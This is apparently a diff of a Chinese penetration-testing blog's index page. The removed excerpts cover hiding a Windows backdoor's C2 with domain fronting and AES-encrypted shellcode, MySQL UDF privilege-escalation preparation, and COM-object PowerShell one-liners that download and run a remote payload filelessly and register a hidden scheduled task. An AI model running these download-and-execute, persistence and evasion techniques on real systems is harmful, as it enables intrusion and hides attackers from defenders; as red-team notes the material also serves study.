-		<h3 id="后门的构成"><a href="#后门的构成" class="headerlink" title="后门的构成"></a>后门的构成</h3><p>分为三个部分:</p>
-<ol>
-<li>shellcode的分离免杀</li>
-<li>C2服务器的隐藏</li>
-<li>Windows后门的设置</li>
-</ol>
-<h3 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h3><p>shellcode的分离免杀有很多种，这里把每个模块拿出来就是如下的几个:</p>
-<ol>
-<li>通信: <code>socket</code>,<code>http</code></li>
-<li><code>shellcode</code>的执行方式</li>
-<li><code>shellcode</code>的流量</li>
-<li>远程服务器的隐藏</li>
-</ol>
-<p>除去第二种方式有很多种可以执行shellcode的，其他三种最好的解决方案是实用<code>Domain Fronting</code>隐藏服务器，AES动态加密解密运行shellcode。这样子既隐藏了服务器，又避免shellcode的明文流量被探测到。当然上线之后的操作被探测不在被讨论的范围之内。</p>
-<p>在参考资料里面,<code>uknownsec</code>已经把主要的代码放出来了。只需要拿出来拼凑一下就可以食用。</p>
-<p>其中服务端出去python的功能之外，可以给自己加上一个<code>slack</code>机器人的通知，这样子上线的时候就有通知。</p>
-<h4 id="C2服务器的隐藏"><a href="#C2服务器的隐藏" class="headerlink" title="C2服务器的隐藏"></a>C2服务器的隐藏</h4>
-	
-	</div>
-  <a type="button" href="/2020/08/28/hide-your-windows-backdoor.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2020/07/29/mysql-UDF.html" >MySql UDF提权注意事项</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2020-07-29  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<blockquote>
-<p>[mysql-udf-exploitation]<a target="_blank" rel="noopener" href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation">https://osandamalith.com/2018/02/11/mysql-udf-exploitation</a><br>MSF的dll: <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p>
-</blockquote>
-<h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><p>先检查运行的mysql结构:</p>
-<pre class="line-numbers language-none"><code class="language-none">select @@version_compile_os, @@version_compile_machine;
-show variables like &#39;%compile%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>结果如下:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> @@version_compile_os, @@version_compile_machine<span class="token punctuation">;</span>
-+----------------------+---------------------------+
-<span class="token operator">|</span> @@version_compile_os <span class="token operator">|</span> @@version_compile_machine <span class="token operator">|</span>
-+----------------------+---------------------------+
-<span class="token operator">|</span> Win64                <span class="token operator">|</span> x86_64                    <span class="token operator">|</span>
-+----------------------+---------------------------+
-MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show variables like <span class="token string">'%compile%'</span><span class="token punctuation">;</span>
-+-------------------------+--------+
-<span class="token operator">|</span> Variable_name           <span class="token operator">|</span> Value  <span class="token operator">|</span>
-+-------------------------+--------+
-<span class="token operator">|</span> version_compile_machine <span class="token operator">|</span> x86_64 <span class="token operator">|</span>
-<span class="token operator">|</span> version_compile_os      <span class="token operator">|</span> Win64  <span class="token operator">|</span>
-+-------------------------+--------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>在<code>Mysql 5.0.67</code>版本开始，UDF的文件必须放在mysql的插件目录: <code>select @@plugin_dir;</code></p>
-<p>可以在开启mysql的时候设置plugin的目录:</p>
-<pre class="line-numbers language-none"><code class="language-none">指定目录:
-mysqld.exe –plugin-dir&#x3D;C:\\temp\\plugins\\
-
-指定配置文件:
-mysqld.exe --defaults-file&#x3D;C:\\temp\\my.ini
-
-配置文件包括如下内容:
-[mysqld]
-plugin_dir &#x3D; C:\\temp\\plugins\\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>老版本的Mysql搜索UDF路径是按照如下的顺序来的:</p>
-	
-
-	</div>
-  <a type="button" href="/2020/07/29/mysql-UDF.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<blockquote>
-<p>[mysql-udf-exploitation]<a target="_blank" rel="noopener" href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation">https://osandamalith.com/2018/02/11/mysql-udf-exploitation</a><br>MSF的dll: <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p>
-</blockquote>
-<h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><p>先检查运行的mysql结构:</p>
-<pre class="line-numbers language-none"><code class="language-none">select @@version_compile_os, @@version_compile_machine;
-show variables like &#39;%compile%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>结果如下:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> @@version_compile_os, @@version_compile_machine<span class="token punctuation">;</span>
-+----------------------+---------------------------+
-<span class="token operator">|</span> @@version_compile_os <span class="token operator">|</span> @@version_compile_machine <span class="token operator">|</span>
-+----------------------+---------------------------+
-<span class="token operator">|</span> Win64                <span class="token operator">|</span> x86_64                    <span class="token operator">|</span>
-+----------------------+---------------------------+
-MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show variables like <span class="token string">'%compile%'</span><span class="token punctuation">;</span>
-+-------------------------+--------+
-<span class="token operator">|</span> Variable_name           <span class="token operator">|</span> Value  <span class="token operator">|</span>
-+-------------------------+--------+
-<span class="token operator">|</span> version_compile_machine <span class="token operator">|</span> x86_64 <span class="token operator">|</span>
-<span class="token operator">|</span> version_compile_os      <span class="token operator">|</span> Win64  <span class="token operator">|</span>
-+-------------------------+--------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>在<code>Mysql 5.0.67</code>版本开始，UDF的文件必须放在mysql的插件目录: <code>select @@plugin_dir;</code></p>
-<p>可以在开启mysql的时候设置plugin的目录:</p>
-<pre class="line-numbers language-none"><code class="language-none">指定目录:
-mysqld.exe –plugin-dir&#x3D;C:\\temp\\plugins\\
-
-指定配置文件:
-mysqld.exe --defaults-file&#x3D;C:\\temp\\my.ini
-
-配置文件包括如下内容:
-[mysqld]
-plugin_dir &#x3D; C:\\temp\\plugins\\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>老版本的Mysql搜索UDF路径是按照如下的顺序来的:</p>
-	
-	</div>
-  <a type="button" href="/2020/07/29/mysql-UDF.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2020/07/16/Com-Object-Pentest-Note2.html" >Com Object</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2020-07-16  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<blockquote>
-<p>COM is the foundation technology for Microsoft’s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.</p>
-</blockquote>
-<p>我就瞎写了:</p>
-<p>COM是在1990s的时候诞生的，可用来分离代码模块和其它内容。</p>
-<h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><pre class="line-numbers language-none"><code class="language-none">Powershell无文件落地执行
-$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;)); $o.Open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload&quot;, $False); $o.Send(); IEX $o.responseText;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-<pre class="line-numbers language-none"><code class="language-none">下载文件,如果需要下载exe，转换成hex或者base64，再编码
-powershell -Command &quot;$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(\&quot;F5078F35-C551-11D3-89B9-0000F81FE221\&quot;)); $o.Open(\&quot;GET\&quot;, \&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload\&quot;, $False); $o.Send();  $o.responseText | Out-File C:\filename.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><pre class="line-numbers language-none"><code class="language-none">$TaskName &#x3D; [Guid]::NewGuid().ToString()
-$Instance &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Schedule.Service&quot;))
-$Instance.Connect()
-$Folder &#x3D; $Instance.GetFolder(&quot;\&quot;)
-$Task &#x3D; $Instance.NewTask(0)
-$Trigger &#x3D; $Task.triggers.Create(0)
-$Trigger.StartBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay))
-$Trigger.EndBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))
-$Trigger.ExecutionTimelimit &#x3D; &quot;PT5M&quot;
-$Trigger.Enabled &#x3D; $True
-$Trigger.Id &#x3D; $Taskname
-$Action &#x3D; $Task.Actions.Create(0)
-$Action.Path &#x3D; “cmd.exe”
-$Action.Arguments &#x3D; “&#x2F;c whoami”
-$Action.HideAppWindow &#x3D; $True
-$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &quot;&quot;, &quot;&quot;, 3)
-
-function Convert-Date &#123;       
-
-        param(
-             [datetime]$Date
-
-        )       
-
-        PROCESS &#123;
-               $Date.Touniversaltime().tostring(&quot;u&quot;) -replace &quot; &quot;,&quot;T&quot;
-        &#125;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<ul>
-<li><a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html</a></li>
-</ul>
-
-	
-
-	</div>
-  <a type="button" href="/2020/07/16/Com-Object-Pentest-Note2.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<blockquote>
-<p>COM is the foundation technology for Microsoft’s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.</p>
-</blockquote>
-<p>我就瞎写了:</p>
-<p>COM是在1990s的时候诞生的，可用来分离代码模块和其它内容。</p>
-<h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><pre class="line-numbers language-none"><code class="language-none">Powershell无文件落地执行
-$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;)); $o.Open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload&quot;, $False); $o.Send(); IEX $o.responseText;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-<pre class="line-numbers language-none"><code class="language-none">下载文件,如果需要下载exe，转换成hex或者base64，再编码
-powershell -Command &quot;$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(\&quot;F5078F35-C551-11D3-89B9-0000F81FE221\&quot;)); $o.Open(\&quot;GET\&quot;, \&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload\&quot;, $False); $o.Send();  $o.responseText | Out-File C:\filename.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><pre class="line-numbers language-none"><code class="language-none">$TaskName &#x3D; [Guid]::NewGuid().ToString()
-$Instance &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Schedule.Service&quot;))
-$Instance.Connect()
-$Folder &#x3D; $Instance.GetFolder(&quot;\&quot;)
-$Task &#x3D; $Instance.NewTask(0)
-$Trigger &#x3D; $Task.triggers.Create(0)
-$Trigger.StartBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay))
-$Trigger.EndBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))
-$Trigger.ExecutionTimelimit &#x3D; &quot;PT5M&quot;
-$Trigger.Enabled &#x3D; $True
-$Trigger.Id &#x3D; $Taskname
-$Action &#x3D; $Task.Actions.Create(0)
-$Action.Path &#x3D; “cmd.exe”
-$Action.Arguments &#x3D; “&#x2F;c whoami”
-$Action.HideAppWindow &#x3D; $True
-$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &quot;&quot;, &quot;&quot;, 3)
-
-function Convert-Date &#123;       
-
-        param(
-             [datetime]$Date
-
-        )       
-
-        PROCESS &#123;
-               $Date.Touniversaltime().tostring(&quot;u&quot;) -replace &quot; &quot;,&quot;T&quot;
-        &#125;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<ul>
-<li><a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html</a></li>
-</ul>
-
-	
-	</div>
-  <a type="button" href="/2020/07/16/Com-Object-Pentest-Note2.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -646,7 +654,7 @@ function Convert-Date &#123;
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>46</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>50</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -667,23 +675,23 @@ function Convert-Date &#123;
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/03/27/pinfish-and-osx-pentest.html" ><i class="fa fa-file-o"></i>记一次钓鱼演练和OS X下的渗透技巧</a>
+      </li>
+    
+      <li>
+        <a href="/2023/03/03/github-trick.html" ><i class="fa fa-file-o"></i>Github搜索小技巧</a>
+      </li>
+    
+      <li>
+        <a href="/2023/02/14/kafka-rce.html" ><i class="fa fa-file-o"></i>Apache Kafka Connect JNDI注入...</a>
+      </li>
+    
+      <li>
+        <a href="/2023/02/13/cname-hijack-openresty.html" ><i class="fa fa-file-o"></i>利用OpenResty进行域名流量劫持</a>
+      </li>
+    
+      <li>
         <a href="/2023/01/16/pay_vuln.html" ><i class="fa fa-file-o"></i>支付接口安全测试记录</a>
-      </li>
-    
-      <li>
-        <a href="/2022/11/08/pve_homelab.html" ><i class="fa fa-file-o"></i>PVE使用注意事项</a>
-      </li>
-    
-      <li>
-        <a href="/2022/10/27/clickhouse-sql-inject.html" ><i class="fa fa-file-o"></i>ClickHouse注入测试记录</a>
-      </li>
-    
-      <li>
-        <a href="/2022/06/23/java-agent-shell.html" ><i class="fa fa-file-o"></i>Java安全笔记(4)-Java Agent</a>
-      </li>
-    
-      <li>
-        <a href="/2022/05/17/godzilla.html" ><i class="fa fa-file-o"></i>哥斯拉原理分析</a>
       </li>
     
   </ul>
